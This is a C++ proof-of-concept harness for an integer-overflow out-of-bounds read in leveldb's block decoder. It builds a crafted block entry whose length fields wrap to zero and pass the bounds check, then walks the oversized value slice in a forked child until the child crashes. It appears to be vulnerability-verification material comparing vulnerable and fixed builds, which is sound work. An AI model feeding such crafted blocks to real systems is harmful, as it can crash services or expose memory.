// LevelOverrun — PoC for an integer-overflow -> out-of-bounds read in Google
// leveldb's block decoder (table/block.cc DecodeEntry), CWE-190 -> CWE-125.
//
// DecodeEntry validates a block entry's length with:
//     if (static_cast<uint32_t>(limit - p) < (*non_shared + *value_length))
//       return nullptr;
// *non_shared and *value_length are uint32_t varints read from the
// (attacker-controlled) block. Their sum is computed in uint32_t and WRAPS, so a
// crafted entry with non_shared=1, value_length=0xffffffff makes the sum 0, the
// bounds check pass, and the iterator hand back a value Slice of length
// 0xffffffff (~4 GiB) that starts at the end of a tiny heap buffer -> any read of
// the value is out of bounds.
//
// This harness drives the REAL leveldb Block iterator (the real table/block.cc +
// util/* compiled from the vendored upstream source) on the exact crafted block
// from the upstream regression test, then PROVES the over-read by walking the
// returned value slice in a forked child (it SIGSEGVs on the vulnerable build).
//
// argv[1] = "VULNERABLE" | "FIXED" (label only; the behaviour comes from which
// block.cc was compiled in).
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <string>
#include <csignal>
#include <unistd.h>
#include <sys/wait.h>

#include "leveldb/slice.h"
#include "leveldb/comparator.h"
#include "leveldb/iterator.h"
#include "table/block.h"
#include "table/format.h"
#include "util/coding.h"

using namespace leveldb;

// Walk the value slice to force the out-of-bounds read; returns normally only if
// (impossibly) nothing is unmapped. Run inside a forked child.
static void touch_value(Slice v) {
  alarm(5); // safety net
  volatile uint8_t sink = 0;
  const char* d = v.data();
  // Touch one byte per page across the claimed length; the first unmapped page
  // beyond the heap buffer triggers SIGSEGV, proving the over-read is real.
  for (uint64_t i = 0; i < (uint64_t)v.size(); i += 4096) {
    sink ^= (uint8_t)d[i];
  }
  (void)sink;
}

int main(int argc, char** argv) {
  const char* label = argc > 1 ? argv[1] : "UNKNOWN";

  // Crafted block, verbatim from leveldb's CorruptedBlockEntryLengthOverflow test.
  std::string data;
  PutVarint32(&data, 0);           // shared = 0
  PutVarint32(&data, 1);           // non_shared = 1
  PutVarint32(&data, 0xffffffff);  // value_length = UINT32_MAX (wraps with +1)
  data.push_back('a');             // 1 key byte so limit - p == 1
  PutFixed32(&data, 0);            // restart[0] = 0
  PutFixed32(&data, 1);            // num_restarts = 1

  BlockContents contents;
  contents.data = Slice(data);
  contents.cachable = false;
  contents.heap_allocated = false;

  Block block(contents);
  Iterator* iter = block.NewIterator(BytewiseComparator());
  iter->SeekToFirst();

  printf("[%s] crafted block (%zu bytes): shared=0 non_shared=1 value_length=0xffffffff\n",
         label, data.size());
  printf("[%s] after SeekToFirst: Valid=%d  status.IsCorruption=%d\n",
         label, iter->Valid(), iter->status().IsCorruption());

  if (!iter->Valid()) {
    printf("[%s] DecodeEntry rejected the overflowing entry -> no OOB. BLOCKED.\n", label);
    delete iter;
    return 0;
  }

  // Vulnerable: DecodeEntry accepted it; the value slice overshoots the buffer.
  Slice v = iter->value();
  const char* buf_end = data.data() + data.size();
  long overshoot = (long)(v.data() + v.size()) - (long)buf_end;
  printf("[%s] iterator ACCEPTED the corrupt entry: value.size=%u, value end is %ld bytes past the %zu-byte block buffer\n",
         label, (unsigned)v.size(), overshoot, data.size());

  pid_t pid = fork();
  if (pid == 0) {
    touch_value(v);
    _exit(0); // reached only if nothing was unmapped
  }
  int st = 0;
  waitpid(pid, &st, 0);
  if (WIFSIGNALED(st) && (WTERMSIG(st) == SIGSEGV || WTERMSIG(st) == SIGBUS)) {
    printf("[%s] reading the value slice crashed with SIG%s -> OUT-OF-BOUNDS READ confirmed. PWNED.\n",
           label, WTERMSIG(st) == SIGSEGV ? "SEGV" : "BUS");
  } else {
    printf("[%s] child exited without a fault (status=%d)\n", label, st);
  }
  delete iter;
  return 0;
}
